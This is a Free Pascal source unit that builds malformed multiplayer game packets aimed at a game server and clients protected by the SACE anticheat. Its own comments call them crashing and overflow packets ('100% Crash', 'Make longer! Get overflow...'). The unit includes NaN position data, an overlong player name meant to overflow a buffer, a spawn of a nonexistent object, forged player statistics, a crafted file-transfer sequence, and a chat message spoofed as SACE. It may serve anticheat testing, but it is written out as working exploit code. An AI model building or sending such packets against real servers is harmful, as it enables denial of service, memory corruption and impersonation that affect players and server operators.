unit badpackets;
{$mode delphi}
interface
uses Packets;

procedure CreateBrokenMovePlayersPacket(p:pNET_Packet; gameid:word); stdcall;
procedure CreateBrokenChangeNamePacket(p:pNET_Packet); stdcall;
procedure CreateBrokenSpawnPacket(p:pNET_Packet); stdcall;
procedure CreateBrokenUpdatePacket(p:pNET_Packet; cl_id:cardinal); stdcall;
procedure CreateBrokenSVConfigGamePacket(p:pNET_Packet); stdcall;
procedure CreateBrokenSaceChatMessage(p:pNET_Packet); stdcall;

procedure CreateFileReceiveStart(p:pNET_Packet; cl_id:cardinal); stdcall;
procedure CreateFileReceivePacket(p:pNET_Packet; cl_id:cardinal); stdcall;

implementation
uses Clients;

procedure CreateBrokenMovePlayersPacket(p: pNET_Packet; gameid: word); stdcall;
//server's crash can appears!!!
var
  b:byte;
  c:cardinal;
begin
  ClearPacket(p);
  WriteToPacket(p, @M_MOVE_PLAYERS, sizeof(M_MOVE_PLAYERS)); //хидер
  b:=1;
  WriteToPacket(p, @b, sizeof(b)); //count
  WriteToPacket(p, @gameid, sizeof(gameid));

  c:=$FFFFFFFF; //NAN
  WriteToPacket(p, @c, sizeof(c));
  WriteToPacket(p, @c, sizeof(c));
  WriteToPacket(p, @c, sizeof(c));
  WriteToPacket(p, @c, sizeof(c));
  WriteToPacket(p, @c, sizeof(c));
  WriteToPacket(p, @c, sizeof(c));
end;

procedure CreateBrokenChangeNamePacket(p: pNET_Packet); stdcall;
//Crash w\o sace, all ok with SACE
var
  s:string;
begin
  ClearPacket(p);
  WriteToPacket(p, @M_CHANGE_SELF_NAME, sizeof(M_CHANGE_SELF_NAME)); //хидер
  //max 64 bytes. Make longer! Get overflow...
  s:='12345678901234567890123456789012345678901234567890123456789012345678901234567890';
  WriteToPacket(p, PChar(s), length(s)+1);
end;

procedure CreateBrokenSpawnPacket(p: pNET_Packet); stdcall;
//100% Crash
var
  s:string;
begin
  ClearPacket(p);
  WriteToPacket(p, @M_SPAWN, sizeof(M_SPAWN)); //хидер
  s:='sace3_anticheat';  //this section does not exist ;)
  WriteToPacket(p, PChar(s), length(s)+1);
end;

procedure CreateBrokenUpdatePacket(p: pNET_Packet; cl_id: cardinal); stdcall;
const
  full_update:byte = 0;
  fake_team:byte = 0;
  rival_kills:word = $FFFF;
  self_kills:word = $FFFF;
  team_kills:word = $FFFF;
  deathes:word = $FFFF;
  money:integer = -1;
  experience:byte = 0;
  rank:byte = 10;
  af_count:byte = $FF;
  ping:word = $FFFF;
  gameid:word = 0;
  skin:byte = $FF;
  voteagree:byte = 0;

  time64:int64 = 0;
  timefactor:single = 0;
  envtime64:int64 = 0;
  envtimefactor:single = 0;

begin
  ClearPacket(p);
  WriteToPacket(p, @M_UPDATE, sizeof(word)); //хидер
  WriteToPacket(p, @cl_id, sizeof(cl_id));
  WriteToPacket(p, @full_update, sizeof(full_update));
  WriteToPacket(p, @fake_team, sizeof(fake_team));
  WriteToPacket(p, @rival_kills, sizeof(rival_kills));
  WriteToPacket(p, @self_kills, sizeof(self_kills));
  WriteToPacket(p, @team_kills, sizeof(team_kills));
  WriteToPacket(p, @deathes, sizeof(deathes));
  WriteToPacket(p, @money, sizeof(money));
  WriteToPacket(p, @experience, sizeof(experience));
  WriteToPacket(p, @rank, sizeof(rank));
  WriteToPacket(p, @af_count, sizeof(af_count));
  WriteToPacket(p, @GAME_PLAYER_FLAG_LOCAL, sizeof(word));
  WriteToPacket(p, @ping, sizeof(ping));
  WriteToPacket(p, @gameid, sizeof(gameid));
  WriteToPacket(p, @skin, sizeof(skin));
  WriteToPacket(p, @voteagree, sizeof(voteagree));

  WriteToPacket(p, @time64, sizeof(time64));
  WriteToPacket(p, @timefactor, sizeof(timefactor));
  WriteToPacket(p, @envtime64, sizeof(envtime64));
  WriteToPacket(p, @envtimefactor, sizeof(envtimefactor));

end;

procedure CreateBrokenSVConfigGamePacket(p: pNET_Packet); stdcall;
var
  s:string;
begin
  ClearPacket(p);
  WriteToPacket(p, @M_SV_CONFIG_NEW_CLIENT, sizeof(M_SV_CONFIG_NEW_CLIENT)); //хидер
  s:='unk';
  WriteToPacket(p, PChar(s), length(s)+1);
end;

procedure CreateFileReceiveStart(p: pNET_Packet; cl_id: cardinal); stdcall;
var
  b:byte;
  s:string;
begin
  ClearPacket(p);
  WriteToPacket(p, @M_GAMEMESSAGE, sizeof(M_GAMEMESSAGE)); //хидер
  WriteToPacket(p, @GAME_EVENT_MAKE_DATA, sizeof(GAME_EVENT_MAKE_DATA));
  b:=2;//e_screenshot_response
  WriteToPacket(p, @b, sizeof(b));

  WriteToPacket(p, @cl_id, sizeof(cl_id));
  s:='\.\test';
  WriteToPacket(p, PChar(s), length(s)+1);
end;

procedure CreateFileReceivePacket(p: pNET_Packet; cl_id: cardinal); stdcall;
var
  b:byte;
  c:cardinal;
begin
  ClearPacket(p);
  WriteToPacket(p, @M_FILE_TRANSFER, sizeof(M_FILE_TRANSFER)); //хидер
  b:=0; //receive_data
  WriteToPacket(p, @b, sizeof(b));
  WriteToPacket(p, @cl_id, sizeof(cl_id));

  c:=1;
  WriteToPacket(p, @c, sizeof(c));//m_data_size_to_receive
  c:=1;
  WriteToPacket(p, @c, sizeof(c));//m_user_param

  WriteToPacket(p, @b, sizeof(b));//data
end;

procedure CreateBrokenSaceChatMessage(p:pNET_Packet); stdcall;
const
  channel_id:word=$FFFF;
  team_id:word=0;
  msg:string='%c[0,0,0,0]';
  name:string='%c[SACE]';
begin
  ClearPacket(p);
  WriteToPacket(p, @M_CHAT_MESSAGE, sizeof(M_CHAT_MESSAGE)); //хидер

  WriteToPacket(p, @channel_id, sizeof(channel_id));
  WriteToPacket(p, PAnsiChar(name), length(name)+1);
  WriteToPacket(p, PAnsiChar(msg), length(msg)+1);
  WriteToPacket(p, @team_id, sizeof(team_id));
end;

end.
